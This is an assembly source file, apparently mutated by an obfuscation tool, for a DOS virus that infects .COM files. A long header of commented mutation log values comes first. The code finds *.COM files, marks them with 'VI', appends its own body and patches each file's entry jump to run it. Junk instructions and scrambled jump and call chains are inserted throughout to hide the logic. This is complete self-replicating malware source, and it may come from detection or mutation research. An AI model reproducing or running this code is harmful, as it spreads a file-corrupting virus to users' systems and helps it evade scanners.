;0.5308869547386285
;NoMutation
;1.4493036943050994
;NoMutation
;1.6493520141250773
;1.1352134383412036
;1.6197896819539979
;NoMutation
;0.9225641775883084
;0.6308338486024346
;0.8312490616897932
;1.2219252535596121
;1.221098275624545
;1.2181232128386594
;0.8244962293028896
;0.4997725929989351
;0.9384977527141748
;0.5240192317109046
;NoMutation
;1.1301616682896138
;0.7021909744581072
;0.5219754311949428
;1.3196665315214495
;1.1187205616418046
;NoMutation
;0.6191395168275919
;1.1132842284042153
;0.7126014891545286
;1.116236685714491
;NoMutation
;0.5125394217669301
;NoMutation
;1.2217076870296586
;1.416033640914233
;0.8098413447274883
;1.0090912680881896
;0.9065841736092461
;0.6108439535336001
;1.3100343492851456
;1.2052940537492478
;0.6143995307407321
;0.4113998509382486
;NoMutation
;1.2043137192939102
;0.5144088780903995
;0.8946746957582411
;1.3896852949989869
;NoMutation
;1.49317197285858
;0.3038452966282362
;1.0951993247161775
;1.5813087620965502
;NoMutation
;0.9015141681488855
;0.6118810141940868
;1.1746109823545468
;1.3551492463804733
;0.7871307240396055
;1.2671736532131324
;0.8912121849682141
;1.2704787421083974
;1.0806115670977012
;UntouchBlock_1
;1.2700462765754654
;0.6886400162515264
;0.9870771817118128
;0.9861561515677203
;0.5945589870181124
;NoMutation
;1.390251838954471
;0.5897262267471906
;NoMutation
;1.0819381064058924
;1.3658624722605122
;UntouchBlock_1
;0.7812492484763506
;NoMutation
;0.6917793720918991
;0.3039100853973526
;0.30484755514699724
;0.4028496305354634
;0.8848474405087408
;1.4527025504938575
;UntouchBlock_1
;0.8825131189059846
;1.0666697834116305
;1.2490676250403392
;UntouchBlock_1
;0.8691689101363479
;1.4415376972738587
;1.1466843826185862
;1.2552653028494134
;1.148274883874807
;0.958971362882092
;0.7737329282330296
;0.5822084536175192
;0.3048580676928439
;1.0581207406440634
;1.246296923453917
;0.7780646887105219
;1.151205021330095
;1.3466672031508296
;0.9556813317169435
;0.9514094318153477
;0.8595091422341773
;0.7682444266501837
;1.140648776568981
;0.6735128824487073
;1.0546354454792113
;1.333044200023399
;1.1413546109723263
;1.34765354054327
;0.6775338386617935
;1.2372502750306544
;1.2257447443159721
;0.9548251742243623
;0.38684301906850577
;1.0346846714122016
;1.4401642045774936
;		JNZ 	_0
;0.8684932411699379
;0.6776784434231549
;0.9605932164268691
;0.5855132221314594
;0.7745474168556137
;0.9655741334821951
;0.9570207137369106
;0.7717911217495399
;0.9536650608488033
;1.1447740767261028
;1.044170320087145
;NoMutation
;0.956899866953816
;1.2384408670200737
;1.5187828808445099
;1.0418100394892962
;1.1277144641186923
;1.320476108559678
;UntouchBlock_1
;0.852531557713913
;0.6620643856647828
;1.3985326658409736
;1.026259739286048
;0.37358843830745975
;NoMutation
;1.0300119906604874
;0.48089053833864914
;1.0285606504713423
;1.2129292589128402
;0.6646482962811571
;1.1268664927180072
;0.9387305424646979
;1.1189584263509835
;NoMutation
;0.6594486846502501
;0.9367679017115895
;NoMutation
;0.4762176483985741
;0.6600187775101686
;1.1083969863699739
;1.2609946191893275
;0.5454196273060252
;0.7528602533449341
;0.4660100332873746
;UntouchBlock_1
;1.2086210651528233
;1.0201797500887175
;UntouchBlock_0
;1.1128186564635592
;1.2977383786070646
;1.0156137180381914
;0.9231986928300384
;0.7424634803072416
;0.9241812395966853
;0.9142460817515872
;UntouchBlock_1
;0.6444036813419656
;NoMutation
;0.37497836271761786
;1.0155064726599092
;NoMutation
;0.9221028008502561
;0.5575845277073267
;0.46585872407145534
;0.7404552833881816
;0.37488013094877337
;1.4636373445979203
;0.3785142936817606
;1.091430829208486
;1.0033900133252538
;0.9152090712150178
;NoMutation
;1.0990865959684417
;0.7349957127010601
;0.7365081255149252
;1.094676375599401
;1.1897684507049813
;NoMutation
;0.8244520977687472
;0.9138651512060123
;1.1872621156611092
;1.283856659707984
;0.9184148627228719
;0.9118374085263654
;0.5521515611811417
;0.6431171582396519
;0.8160701279607984
;0.9100048462683172
;0.7201556077171638
;UntouchBlock_1
;0.9916891042443524
;UntouchBlock_1
;0.45965282778198807
;0.8961512398264543
;1.2499267525441666
;0.8131384863124148
;0.6382606397160281
;0.9879776655005881
;1.338076805136289
;1.222617320349979
;0.9703888417200285
;0.7061245369098882
;1.1326623563327527
;1.1352607839593192
;0.7875516282570841
;UntouchBlock_1
;0.8792692887226575
;1.3104923796834813
;0.26722873772567246
;NoMutation
;0.9619043755815526
;0.5310492923934664
;1.046471246235685
;UntouchBlock_1
;0.6053775753733733
;UntouchBlock_1
;0.6090915864420964
;1.3715809134407273
;UntouchBlock_1
;1.3738105975819395
;0.6946467300309295
;1.1209174666792145
;0.8639289374130721
;1.283039746150101
;1.0318107533606622
;1.1954767394729326
;NoMutation
;0.78003750715208
;1.0319701524295746
;0.6915435784521543
;0.4429653225052662
;1.0246309597514012
;1.5249513938853034
;UntouchBlock_0
;0.7643453008747294
;1.2500160979819712
;NoMutation
;0.5816035820131037
;1.2447428754535435
;0.3344370859396355
;UntouchBlock_1
;0.9146382984133057
;1.0756477852596351
;0.2673124600898692
;0.1831728843734287
;0.919971043783946
;1.411678007584987
;0.9187952409869357
;0.505478780377565
;0.9941362338055583
;0.4265662280387936
;0.17645228944838862
;0.27004817714830665
;0.8891950463258003
;0.4985182075536013
;0.674973034658816
;0.4128643041690896
;UntouchBlock_1
;0.8273437305159805
;1.0689574732919582
;UntouchBlock_0
;0.7423660596239225
;0.5790389821500561
;0.4198805498435727
;0.26311284651704625
;0.6436110810878254
;1.283284605144861
;0.17025359278632632
;0.8785241031079919
;0.41109404081762896
;0.8672354793159601
;0.6360067087193257
;1.1657477482747922
;NoMutation
;0.5589446145461302
;1.0245488610169828
;0.5639198701385295
;0.4894921257496411
;0.7886902418091752
;0.7870997488790547
;0.6282220673956864
;0.9302553777151843
;0.9359682669136371
;0.711807130324422
;0.32759880567369765
;0.8636666136637364
;0.6285981744295815
;0.7854170011727247
;0.5492112544665774
;0.6230659615219177
;0.9308660245707621
;NoMutation
;0.7750678770948911
;0.5419955519207743
;0.5397573279293648
;UntouchBlock_0
;0.3192905261446521
;0.9868597489429116
;0.9146401156193138
;UntouchBlock_1
;0.5444406278519082
;0.7671351843673657
;0.613576777560531
;0.6131527981500581
;0.6140576298721139
;1.0686525359449832
;0.31097784917859644
;0.32050272683936976
;0.2461566363075768
;0.3815987094843325
;NoMutation
;0.8337769915635825
;0.9079086691840685
;0.2446684727492525
;NoMutation
;0.8178165270171748
;NoMutation
;1.1589211624856566
;0.2447569075162856
;NoMutation
;0.7921184779694547
;0.6222471113963296
;NoMutation
;0.7548495568470988
;NoMutation
;1.0388293437369542
;0.6131516990692244
;NoMutation
;0.5908563261298744
;0.8160870232120974
;ForcedJMP_0
;0.9581135467612105
;		JNZ 	_0
;0.4388667287619631
;0.918522769784905
;0.43690256285631734
;0.837298739162865
;		JZ 	_1
;1.0410674508338356
;0.816336632280223
;0.4974189877949624
;0.7857371255599359
;0.38685132876651385
;0.8278546924994953
;UntouchBlock_1
;0.569198027590237
;NoMutation
;0.5209025782712705
;0.8419489929497505
;0.8142932856989016
;0.7315160165521475
;0.67914158146108
;0.8908569058215873
;0.22901177454199398
;0.8021492729264188
;0.7257526055236225
;0.995333594533272
;0.5576443979498745
;0.6485708563741065
;0.5495382088316002
;0.29363702253986784
;0.7840320658825709
;0.9154523006681761
;0.33681465166392194
;		JNZ 	_1
;0.9325968683157081
;1.193121942671225
;0.7318486278451954
;0.24783220204083758
;0.6082626633413577
;0.8597556243175115
;0.5852149464283245
;ForcedJMP_0
;0.8490966393617795
;0.9228702455691321
;NoMutation
;0.5978994689900239
;0.6536509749444692
;0.5176917889749943
;0.5839736681695816
;1.033977795882297
;1.1560977992728676
;0.17147436639551353
;0.22656586751475508
;1.4153652740663514
;0.8454230432854027
;1.0581071166246194
;0.7790778003618842
;NoMutation
;1.3136328328175049
;NoMutation
;0.9652913414048129
;UntouchBlock_1
;1.3657095546665625
;0.9102037042772114
;UntouchBlock_0
;0.8533383723610009
;1.2149957934071847
;0.8898656602015989
;NoMutation
;1.5218218810001056
;1.0215120941807776
;0.8783058684616659
;1.3260034836084977
;1.150679744595221
;NoMutation
;1.4824653437240278
;1.083899111637266
;1.938056102517086
;NoMutation
;1.1051483593749514
;0.9158820703067528
;NoMutation
;0.8437720966702736
;1.2611213019202159
;UntouchBlock_0
;0.9845396122127356
;1.5487192179996323
;1.0351589573056779
;1.0479802450694016
;1.0072253332486678
;NoMutation
;1.2464246250298843
;		JZ 	_1
;1.1191642732077671
;0.7968580758856725
;1.1288995690785073
;NoMutation
;0.6392085583105253
;1.292276213564073
;NoMutation
;1.5291553319589735
;1.8347834410390995
;NoMutation
;1.7793975640412638
;0.9206970055287376
;1.3765001233315244
;1.099294727391498
;		JNZ 	_0
;0.8135642879762333
;0.752452215215072
;0.6618733400013735
;1.2595563750020038
;UntouchBlock_0
;0.8199901224342695
;1.2348778667044475
;NoMutation
;0.9231114027938093
;1.3600045421635947
;ForcedJMP_0
;0.8943176334251751
;0.9312462577517224
;1.3367676219101698
;1.292704293442423
;0.9669678716667839
;0.9287935142236053
;0.727006612990512
;NoMutation
;1.1361929554128058
;1.3120433814125192
;1.1472975459459895
;		JNZ 	_0
;1.425243094152187
;0.7624420392398671
;1.272808666560585
;0.9176494494790801
;1.1334166492530158
;NoMutation
;1.0449151220283706
;1.1798659299717555
;NoMutation
;0.7440460293033023
;UntouchBlock_0
;0.695899679653927
;UntouchBlock_0
;1.1056490490347775
;0.7491528994492185
;0.8743571980441918
;0.9724384070892272
;UntouchBlock_0
;1.111661926135044
;0.921053247013991
;NoMutation
;0.971046480531697
;0.8968661031889721
;1.028721322940532
;0.9940430564103042
;NoMutation
;0.8371968137593535
;		JZ 	_0
;0.9917613198966911
;0.9090807214918565
;0.7018322992544448
;1.2525178695400343
;1.4138227643175938
;0.9310362451208348
;0.8133643859787258
;1.3488983076074055
;0.7237707650415697
;		JZ 	_0
;1.0022518251231047
;UntouchBlock_1
;0.8671411753788609
;1.0744136103025161
;0.8387716302846366
;0.7388894614587315
;		JNZ 	_0
;0.8211875206760494
;1.3156624617338966
;		JZ 	_0
;0.9875810337961379
;0.843890445839127
;1.0218552462872028
;0.7942586396004981
;UntouchBlock_1
;0.7174149456102746
;NoMutation
;0.6513705602138314
;1.018709169765668
;		JNZ 	_0
;0.8173340449565346
;ForcedJMP_0
;0.7976666598576024
;0.9260241176451748
;0.7285404385847317
;		JNZ 	_1
;1.0498681516675736
;NoMutation
;1.1352544046113597
;		JNZ 	_0
;1.3457917464878344
;ForcedJMP_0
;1.137380692560457
;0.7328471046037495
;NoMutation
;0.6265302611168132
;0.7465477621339928
;0.9845326513247107
;NoMutation
;0.6703808459993071
;1.0052594222468623
;UntouchBlock_1
;0.7971354214120052
;UntouchBlock_0
;1.1265292826357194
;		JZ 	_0
;0.8746866249894786
;0.8667447599148076
;0.635269056806789
;0.8625962277670404
;0.9100736262559588
;0.9237004551229545
;0.8969805647773494
;0.7155882069075618
;0.8453143224958347
;0.7027967042173047
;0.696715317745589
;0.687148721872204
;0.5815240776325028
;0.5377133475217867
;0.6258139297607741
;		JNZ 	_0
;0.6331502574664137
;0.47370998132198133
;		JZ 	_0
;0.5852984328548027
;0.509231860715335
;		JNZ 	_0
;0.6234511239643271
;ForcedJMP_1
;0.5747161439650962
;		JNZ 	_0
;0.37632217777115434
;0.3643244843631317
;0.609217053704701
;ForcedJMP_0
;0.41601806465353797
;0.42727864806883764
;0.47369897291792423
;0.500964397242813
;0.4741348099395549
;0.540970867055242
;0.47147636211211397
;0.3593463672200234
;0.4999618239527441
;0.28618364993170387
;0.3698996153594762
;		JNZ 	_0
;0.2993600875965447
;		JZ 	_0
;0.27241597644882765
;0.22908126963684564
;0.26506478985500953
;0.23517101776257346
;ForcedJMP_0
;0.27453838282005644
;0.2542789842496291
;UntouchBlock_0
;		JZ 	_1
;		JNZ 	_0
;ForcedJMP_0
MAIN    SEGMENT BYTE
		ASSUME  CS:MAIN,DS:MAIN,SS:NOTHING
		ORG     100H

HOST:
		jmp     NEAR PTR VIRUS_START   
        db      'VI'
        mov     ah,4CH
        mov     al,0
        int     21H              

VIRUS:   		                 
COMFILE DB      '*.COM',0        

VIRUS_START:
        call    GET_START       

GET_START:
        sub     WORD PTR [VIR_START],OFFSET GET_START - OFFSET VIRUS
        mov     dx,OFFSET DTA   
		JMP 	IYEOH
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
IYEOH:
        mov     ah,1AH          
        int     21H        
        call    FIND_FILE       
        jz      N1
        jmp     EXIT_VIRUS      
        N1:
        call    INFECT          
        mov     dx,OFFSET FNAME 
LSZFK:
		JMP 	WZDUC
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
WZDUC:
		JMP 	LNKMS
nop
nop
nop
nop
nop
nop
LNKMS:
        mov     WORD PTR [HANDLE],24H    
		JMP 	BUQFF
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
BUQFF:
        mov     ah,9  
		JMP 	KDKCN
_TJOI:
		JMP 	D_IEA
BPCAO:
CJ_HF:
		call 	 IEZFO
EXXED:
		call 	 ZGSWR
XYSSM:
		call 	 HGVQV
KDKCN:
		call 	 _TJOI
XEEGC:
		call 	 WZEKK
        int     21H             

EXIT_VIRUS:
        mov     dx,80H          
JZ WZEKK
JMP XEEGC
WZEKK:
        mov     ah,1AH          
JZ GKPRU
JMP KMC_W
GKPRU:
        int     21H             
        mov     bx,[VIR_START]  
JNZ HGVQV
JMP XYSSM
HGVQV:
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)]  
        mov     WORD PTR [HOST],ax 
		JMP 	_GFSZ
_B_JU:
		JMP 	SNWRP
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
SNWRP:
        mov     ax,WORD PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+2]        
AXYGY:
JNZ BHOAB
JMP FEZKG
BHOAB:
		JMP 	GP_JB
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
GP_JB:
		JMP 	TFIRI
nop
nop
nop
nop
nop
TFIRI:
        mov     WORD PTR [HOST+2],ax        
JNZ ZGSWR
JMP EXXED
ZGSWR:
		JMP 	MHPUF
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
MHPUF:
        mov     al,BYTE PTR [bx+(OFFSET START_CODE)-(OFFSET VIRUS)+4]        
NSFHQ:
BRWZS:
HFCLR:
MLAQN:
JNZ MPREL
JMP QWYEX
MPREL:
        mov     BYTE PTR [HOST+4],al        
EDPWK:
		JMP 	WDSOL
JRKAP:
JZ IEZFO
JMP CJ_HF
IEZFO:
		JMP 	WENUA
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
WENUA:
		JMP 	VBXAR
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
VBXAR:
        mov     [VIR_START],100H   
		JMP 	IHSGZ
JWEUH:
D_IEA:
		call 	 BPCAO
FEZKG:
		call 	 BHOAB
_GFSZ:
		call 	 _B_JU
QWYEX:
		call 	 MPREL
WDSOL:
		call 	 JRKAP
IHSGZ:
		call 	 JWEUH
        ret                     

START_CODE:                     
        nop                     
        nop                     
        nop        
        nop        
MYPVF:
		call 	 BN_I_
OQVCT:
		call 	 ARXIC
        nop             

KMC_W:
QHNGS:
		call 	 OYVQP
		call 	 GKPRU


FIND_FILE:
        mov     dx,[VIR_START]
JZ ARXIC
JMP OQVCT
ARXIC:
        mov     cx,3FH          
JZ BN_I_
JMP MYPVF
BN_I_:
JZ OYVQP
JMP QHNGS
OYVQP:
        mov     ah,4EH          
AEIF_:
		call 	 ANHMV
        int     21H


FF_LOOP:
        or      al,al           
		jnz     N2
        jmp     FF_DONE
        N2:         
		call    FILE_OK         
		jnz     N3
        jmp     FF_DONE         
        N3:
		mov     ah,4FH          
JZ ANHMV
JMP AEIF_
ANHMV:
		int     21H             
MZ__U:
		call 	 KKCKH
GSLDW:
		call 	 MEDVQ
		jmp     FF_LOOP         

FF_DONE:
        ret
ZQWGE:
UQCXZ:
		call 	 PKTHY
UWRQJ:
		call 	 DIJS_
BBJZJ:
		call 	 OTRTH
		call 	 SQLFF
EXCTM:
		call 	 IXGFC
UFYCB:
		call 	 UEPFI
MFKBO:
		call 	 DBRRB
HDBZN:
		call 	 JGUPO


FILE_OK:        
        mov     dx,OFFSET FNAME 
		JMP 	UFYCB
UEPFI:
        mov     dx,OFFSET FNAME 
JZ DBRRB
JMP MFKBO
DBRRB:
        mov     ax,3D02H      
JZ JGUPO
JMP HDBZN
JGUPO:
JZ KKCKH
JMP MZ__U
KKCKH:
        int     21H        
        jc      FOK_NZEND     
        mov     bx,ax         
JNZ MEDVQ
JMP GSLDW
MEDVQ:
		JMP 	UQCXZ
PKTHY:
        push    bx            
        mov     cx,5          
LSSGG:
JZ IXGFC
JMP EXCTM
IXGFC:
JNZ DIJS_
JMP UWRQJ
DIJS_:
		JMP 	RCWHC
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
RCWHC:
        mov     dx,OFFSET START_IMAGE         
NMIXF:
        mov     ah,3FH        
YKAIK:
SNSZF:
JZ OTRTH
JMP BBJZJ
OTRTH:
		JMP 	ZQWGE
SQLFF:
        int     21H        		
        pop     bx            
        mov     ah,3EH        
        int     21H           
		JMP 	_JWCZ
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
_JWCZ:
        mov     ax,WORD PTR [FSIZE]               
TPEMN:
        add     ax,OFFSET ENDVIRUS - OFFSET VIRUS 
        jc      FOK_NZEND                         
        cmp     BYTE PTR [START_IMAGE],0E9H 
        jz      N4
        jmp 	FOK_ZEND        
        N4: 
        cmp     WORD PTR [START_IMAGE+3],4956H 
        jz      N5
        jmp     FOK_ZEND           
_ILBH:
		call 	 WECYW
        N5:
LQAZH:
		call 	 _HYO_


FOK_NZEND:
        mov     al,1          
        or      al,al         
RKFVK:
		call 	 GSMZI
WHGHT:
		call 	 YBZ_F
        ret

FOK_ZEND:
        xor     al,al         
        ret    
        

INFECT:
		JMP 	YOQDB
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
YOQDB:
        mov     dx,OFFSET FNAME  
		JMP 	LQAZH
_HYO_:
		JMP 	WNOIJ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
WNOIJ:
        mov     ax,3D02H        
FNIAO:
        int     21H        
		JMP 	BUCRT
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
BUCRT:
        mov     WORD PTR [HANDLE],ax            
JZ YBZ_F
JMP WHGHT
YBZ_F:
		JMP 	_ILBH
WECYW:
        xor     cx,cx                       
        mov     dx,cx               
WCYJD:
VLQNJ:
        mov     bx,WORD PTR [HANDLE]        
FLUIZ:
MSBDZ:
PUFYJ:
RLNGB:
JNZ GSMZI
JMP RKFVK
GSMZI:
		JMP 	OAUJR
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
OAUJR:
		JMP 	FHOXQ
nop
nop
nop
nop
nop
FHOXQ:
		JMP 	VY_U_
cmp cx,dx
cmp cx,dx
cmp cx,dx
VY_U_:
        mov     ax,4202H                    
KIAAR:
OZXF_:
VMMOH:
        int     21H        
        mov     cx,OFFSET FINAL - OFFSET VIRUS 
XHY_W:
        mov     dx,[VIR_START]           
MMLWB:
SPUGQ:
JCFQA:
QZSPZ:
        mov     bx,WORD PTR [HANDLE]                         
SMZBL:
		JMP 	SQFKK
nop
nop
nop
nop
nop
SQFKK:
        mov     ah,40H                                      
FYSCM:
YWPRQ:
WPMOS:
LDKHZ:
IVDXC:
        int     21H        
        xor     cx,cx           
		JMP 	PUDZV
nop
nop
nop
nop
nop
nop
nop
PUDZV:
        mov     dx,WORD PTR [FSIZE]   
WRXJH:
        add     dx,OFFSET START_CODE -  OFFSET VIRUS     
		JMP 	AYXHG
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
AYXHG:
        mov     bx,WORD PTR [HANDLE]                         
KKMMX:
BCXHV:
        mov     ax,4200H                               
SP_NU:
JY_ZE:
        int     21H        
        mov     cx,5                                    
AFAQY:
QQRXJ:
YQGAZ:
WNXDF:
		JMP 	NBQYT
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
NBQYT:
        mov     bx,WORD PTR [HANDLE]                    
WJDFP:
RFTTC:
        mov     dx,OFFSET START_IMAGE                  
BWFLF:
		JMP 	ZWTLC
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
ZWTLC:
        mov     ah,40H        
EURYE:
CRPBO:
        int     21H        
        xor     cx,cx                                 
		JMP 	GZBWN
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
GZBWN:
        mov     dx,cx                             
        mov     bx,WORD PTR [HANDLE]         
		JMP 	YBPQY
nop
nop
nop
nop
nop
nop
YBPQY:
		JMP 	ZGLLK
xor bx,cx
xor bx,cx
ZGLLK:
        mov     ax,4200H                          
		JMP 	ASQMM
QDQPU:
        int     21H
        mov     bx,[VIR_START]                    
KUZAG:
C_RZE:
ASCKF:
		JMP 	JGOLF
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
JGOLF:
        mov     BYTE PTR [START_IMAGE],0E9H     
PILAA:
BDDSE:
		JMP 	HYR_K
OBJDT:
        mov     ax,WORD PTR [FSIZE]             
        add     ax,OFFSET VIRUS_START-OFFSET VIRUS-3 
        mov     WORD PTR [START_IMAGE+1],ax        
		JMP 	AMNLN
SWSWT:
		JMP 	SRYHR
nop
nop
nop
nop
SRYHR:
        mov     WORD PTR [START_IMAGE+3],4956H       
OTZFM:
SXLXY:
		JMP 	HWDYZ
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
HWDYZ:
		JMP 	DLIYE
nop
nop
nop
nop
nop
nop
nop
DLIYE:
        mov     cx,5   
FYWBR:
        mov     dx,OFFSET START_IMAGE      
FTYKP:
UEFTH:
		JMP 	CRYNQ
nop
CRYNQ:
        mov     bx,WORD PTR [HANDLE]       
XBZ_C:
ZOEXE:
YPDIB:
ECSOM:
		JMP 	GAXXR
UKEOR:
		JMP 	VWQHD
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
VWQHD:
		JMP 	PRTUV
cmp ax,bx
cmp ax,bx
PRTUV:
        mov     ah,40H                     
FIKEC:
FIGMJ:
UVJAY:
NEUHK:
        int     21H        
        mov     bx,WORD PTR [HANDLE]       
JNZ CY_NP
JMP HCZPN
CY_NP:
		JMP 	_MJF_
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
_MJF_:
        mov     ah,3EH                     
JZ _TAGL
JMP VKYBG
_TAGL:
        int     21H        
ASQMM:
		call 	 QDQPU
HYR_K:
		call 	 OBJDT
AMNLN:
		call 	 SWSWT
GAXXR:
		call 	 UKEOR
HCZPN:
		call 	 CY_NP
VKYBG:
		call 	 _TAGL
        ret                                

FINAL:           
ENDVIRUS        EQU     $ + 212    


       ORG     0FF2AH

DTA             DB      1AH dup (?) 
FSIZE           DW      0,0         
FNAME           DB      13 dup (?)  
HANDLE          DW      0           
START_IMAGE     DB      0,0,0,0,0   
VSTACK          DW      50H dup (?) 
VIR_START       DW      (?)         

MAIN    ENDS

        END     HOST                   